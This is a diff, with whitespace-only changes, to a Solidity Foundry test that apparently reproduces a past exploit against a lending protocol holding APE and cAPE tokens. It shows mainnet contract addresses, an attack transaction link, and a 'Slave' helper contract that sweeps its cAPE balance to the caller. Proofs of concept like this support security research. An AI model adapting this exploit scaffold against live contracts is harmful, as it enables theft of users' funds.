@@ -10,6 +10,7 @@ import "./../interface.sol";
 // https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a
 
 contract ContractTest is Test {
+
     address _pcAPE = 0xDDDe38696FBe5d11497D72d8801F651642d62353;
     address _vDebtUSDC = 0x1B36ad30F6866716FF08EB599597D8CE7607571d;
     address _vDebtwstETH = 0xCA76D6D905b08e3224945bFA0340E92CCbbE5171;
@@ -247,9 +248,11 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
 
 contract Slave {
+
     address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
     address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;
     address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;
@@ -278,4 +281,5 @@ contract Slave {
         // transfer(recipient, amount) -> (bool _: true)
         _cAPE.call(abi.encodePacked(bytes4(0xa9059cbb), abi.encode(msg.sender, IERC20(_cAPE).balanceOf(address(this)))));
     }
+
 }
